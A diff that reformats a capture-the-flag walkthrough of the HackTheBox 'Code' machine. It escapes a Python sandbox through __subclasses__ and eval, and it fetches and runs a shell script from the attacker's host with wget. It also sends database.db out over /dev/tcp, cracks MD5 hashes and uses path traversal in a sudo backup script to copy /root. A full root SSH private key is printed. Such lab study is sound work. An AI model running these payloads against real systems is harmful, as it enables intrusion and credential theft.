@@ -1,7 +1,7 @@
 # Reconnaissance
 ## Nmap Enumeration
 - We pass the commands:
-	```
+```
 nmap -sV -sC -vv 10.10.11.62
 nmap -sU --top-ports=10 -vv 10.10.11.62
 
@@ -68,7 +68,7 @@ n/a
 		- For `os` in import("os") it would require " at the end instead of ' like `'__imp'+'ort__("o'+'s")'`
 
 - First to see if the above explanation is actually seen:
-	```
+```
 x=''.__class__
 print(x)
 ----
@@ -96,7 +96,7 @@ Too big
 ```
 - From here we create a loop to access `__init__.__globals__` and search for the `__builtin__` dictionary to find the eval function..
 	- And if it finds the eval, function it executes out code.
-		```
+```
 x = ''.__class__.__bases__[0].__subclasses__()
 for i in range(len(x)):
     try:
@@ -108,11 +108,11 @@ for i in range(len(x)):
     except:
         pass
 ```
-		- Note the `\` between `bash -c` and `'bash -i` aswell as after `1`
-			- without it `'` would close the string and not take the remaining argument.
+- Note the `\` between `bash -c` and `'bash -i` aswell as after `1`
+	- without it `'` would close the string and not take the remaining argument.
 - To further understand the above loop, let's try to find which subclass location has eval first and then we can pass a simply command like ls to see it's output.
 	- To find subclass locations with eval:
-		```
+```
 x = ''.__class__.__bases__[0].__subclasses__() 
 for i in range(len(x)):
     try:
@@ -126,16 +126,16 @@ for i in range(len(x)):
 ---OUTPUT---
 80 81 82 83 99 100 101 103 104 105 107 108 109 110 132 133 134 136 137 138 139 166 174 175 176 178 179 185 186 187 188 189 192 193 194 195 196 197 198 199 206 207 208 209 210 211 212 214 215 216 222 223 224 225 226 227 228 230 231 232 248 249 250 251 252 253 254 255 256 257 259 260 261 262 263 264 265 266 269 270 271 272 273 274 275 276 277 282 283 284 285 287 288 289 290 291 293 295 296 297 299 300 301 302 304 305 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 332 333 334 335 336 341 342 343 344 345 346 352 353 354 355 357 358 359 360 364 366 367 368 369 370 371 372 373 374 375 376 377 378 389 390 391 392 393 395 396 400 410 411 413 414 415 416 417 418 419 420 421 422 423 424 427 428 429 430 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 455 456 457 458 459 460 461 463 464 465 466 467 468 469 470 471 472 473 474 475 477 478 479 480 481 485 486 487 488 489 491 495 497 498 499 500 501 502 504 505 506 509 510 511 512 513 514 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 532 533 534 536 538 540 541 543 544 553 560 563 565 566 567 568 569 570 572 573 582 584 585 586 588 589 590 591 592 593 597 598 605 606 610 612 625 626 627 635 638 639 641 643 644 645 646 647 648 649 650 655 660 663 664 667 668 669 671 672 673 674 675 676 678 679 680 681 682 683 685 690 691 692 693 694 695 697 698 699 700 701 702 703 704 709 711 712 713
 ```
-		- Explanation:
-			- We sift through the subclasses assigning g to `__init__.__globals__` and check for the `__builtin__` dictionary. 
-				- if no `__init__.__globals__` for the sublcass, it will jump to the  `except` case 
-				- If it does, it will continue on to the next loop
-			- If the `__builtins__` dictionary exists, it assigns, e to `[__builtins__][eval]` 
-				- if there is no eval it goes to the `except` case and moves on to the next loop
-				- if there is, it will print i
-					- i is the subclass number where eval exists.
+- Explanation:
+	- We sift through the subclasses assigning g to `__init__.__globals__` and check for the `__builtin__` dictionary. 
+		- if no `__init__.__globals__` for the sublcass, it will jump to the  `except` case 
+		- If it does, it will continue on to the next loop
+	- If the `__builtins__` dictionary exists, it assigns, e to `[__builtins__][eval]` 
+		- if there is no eval it goes to the `except` case and moves on to the next loop
+		- if there is, it will print i
+			- i is the subclass number where eval exists.
 	- A more cleaner code (remove `break` to see all subclass locations, for now it shows just 1):
-		```
+```
 for i, subclass in enumerate(''.__class__.__bases__[0].__subclasses__()):
     try:
         g = subclass.__init__.__globals__
@@ -149,16 +149,16 @@ for i, subclass in enumerate(''.__class__.__bases__[0].__subclasses__()):
 80
 ```
 - We can use any of those subclass numbers to pass our eval function:
-	```
+```
 x = ''.__class__.__bases__[0].__subclasses__()[445].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").sy'+'stem("ls /")')
 print(x)
 
 ---OUTPUT---
 0
 ```
-	- I try to pass ls command and get an output 0. This implies the command ran successfully but since system doesn't print output just responds in 0 and 1 we don't really see the / directory.
+- I try to pass ls command and get an output 0. This implies the command ran successfully but since system doesn't print output just responds in 0 and 1 we don't really see the / directory.
 	- Instead we can use the `popen("<command>").read()` command
-		```
+```
 x=''.__class__.__bases__[0].__subclasses__()[516].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("ls /").re'+'ad()')
 print(x)
 
@@ -168,14 +168,14 @@ bin boot dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root 
 -------
 - Alternatively you can write a file and call it (reference: https://www.hyhforever.top/htb-code/)
 	- Write the file and host a python server in local machine in that directory with file (`python3 -m http.server 80`)
-		```
+```
 print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("wget 10.10.14.25/shell.sh -O /tmp/shell.sh").re'+'ad()'))
  
 print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("bash /tmp/shell.sh").re'+'ad()'))
 ```
-	- popen seems like a better option as we can capture the output whereas system just responds with 0 and 1
-		- So to refine our command
-			```
+- popen seems like a better option as we can capture the output whereas system just responds with 0 and 1
+	- So to refine our command
+```
 x = ''.__class__.__bases__[0].__subclasses__()
 for i in range(len(x)):
     try:
@@ -187,7 +187,7 @@ for i in range(len(x)):
     except Exception as y:
         continue
 ```
-			- Also removed the read() as there's nothing to read.
+- Also removed the read() as there's nothing to read.
 - With netcat listening e should catch a reverse shell.
 	- can grab user flag
 	- Tried to get better shell (using script as well as python3 -c pty.spawn commands...the pyhton3 one made it impossible to use and the script command  gave no noticeable difference.)
@@ -195,7 +195,7 @@ for i in range(len(x)):
 ## Lateral Movement
 - In user's folder we find database.db in app>instances folder
 - We get it to our local machine :
-	```
+```
 cat database.db > /dev/tcp/10.10.14.25/9998 0>&1
 
 ---ON-LOCAL-MACHINE---
@@ -211,16 +211,16 @@ id|username|password
 1|development|759b74ce43947f5f4c91aeddc3e5bad3
 2|martin|3de6f30c4a09c27fc71932bfc68474be
 ```
-	- checked the length:
-		```
+- checked the length:
+```
 echo -n "759b74ce43947f5f4c91aeddc3e5bad3" | wc -c
 
 ---OUTPUT---
 32
 ```
-		- possible MD5
+- possible MD5
 - Cracked via : https://crackstation.net/ or hashcat (save hash to filename hash)
-	```
+```
 hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
 hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show 
 
@@ -228,11 +228,11 @@ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show
 3de6f30c4a09c27fc71932bfc68474be:nafeelswordsmaster
 759b74ce43947f5f4c91aeddc3e5bad3:development
 ```
-	- We can ssh into machine (can also do su martin but for a better shell better to ssh)
+- We can ssh into machine (can also do su martin but for a better shell better to ssh)
 -----
 ## Privilege Escalation
 - we pass 
-	```
+```
 sudo -l
 
 ---OUTPUT---
@@ -243,14 +243,14 @@ User martin may run the following commands on localhost:
     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
 ```
 - I pass the command:
-	```
+```
 sudo /usr/bin/backy.sh
 
 ---OUTPUT---
 Usage: /usr/bin/backy.sh <task.json>
 ```
 - Reading backy.sh
-	```
+```
 cat /usr/bin/backy.sh 
 
 
@@ -296,12 +296,12 @@ done
 
 /usr/bin/backy "$json_file"
 ```
-	- Checks for string `../` and replaces it with `""`
-	- Looks for task.json
-		- if it exists, reads `directories_to_archive`
-			- directory has to start with `/home` or `/var`
+- Checks for string `../` and replaces it with `""`
+- Looks for task.json
+	- if it exists, reads `directories_to_archive`
+		- directory has to start with `/home` or `/var`
 - We create a file task.json :
-	```json
+```
 {
   "directories_to_archive": ["/home/.../.../..//root/"],
 }
@@ -311,16 +311,16 @@ done
   "directories_to_archive": ["/home/..././root/"],
 }
 ```
-	- Pass the command (FAILS)
-		```
+- Pass the command (FAILS)
+```
 sudo /usr/bin/backy.sh task.json
 2025/04/27 22:35:43 🍀 backy 1.2
 2025/04/27 22:35:43 📋 Working with task.json ...
 2025/04/27 22:35:43 🔰 Task configuration: destination must be specified!
 2025/04/27 22:35:43 ❗ Can't read provided task configuration
 ```
-	- I set the destination and try again 
-		```json
+- I set the destination and try again 
+```
 {
   "directories_to_archive": ["/home/.../.../..//root/"],
   "destination": "/home/martin"
@@ -334,20 +334,20 @@ sudo /usr/bin/backy.sh task.json
 2025/04/27 22:36:58 📥 To: /home/martin ...
 2025/04/27 22:36:58 📦
 ```
-		- initially i put `["/home/martin"]` and it failed as putting `[]` makes it an array and it needs a string.
-		- Cleaner to use `..././` but i initiallu used the above hence that's what is pasted
+- initially i put `["/home/martin"]` and it failed as putting `[]` makes it an array and it needs a string.
+- Cleaner to use `..././` but i initiallu used the above hence that's what is pasted
 - We find a zip file and unzip it:
-	```
+```
 tar -xjf code_home_.._root_2025_April.tar.bz2
 ```
 - We navigate to root folder that's been copied to /home/martin and read the root flag
-	```
+```
 cd root
 cat root.txt
 ```
 - Can also grab the ssh key file at `.ssh/id_rsa`
 	- json file:
-		```json
+```
 {
   "directories_to_archive": [
     "/home/../root/.ssh/id_rsa"
@@ -355,8 +355,8 @@ cat root.txt
   "destination": "/home/martin"
 }
 ```
-	- `id_rsa`
-		```
+- `id_rsa`
+```
 tar -xjf code_home_.._root_.ssh_id_rsa_2025_April.tar.bz2
 cd /root/.ssh/
 cat id_rsa
@@ -401,8 +401,8 @@ j6PbYp7f9qvasJPc6T8PGwtybdk0LdluZwAC4x2jn8wjcjb5r8LYOgtYI5KxuzsEY2EyLh
 hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
 -----END OPENSSH PRIVATE KEY-----
 ```
-	- Copy the file to local machine and set permissions
-		```
+- Copy the file to local machine and set permissions
+```
 vi root_id_rsa # copy key here
 chmod 0600 root_id_rsa
 ssh -i root_id_rsa root@10.10.11.62
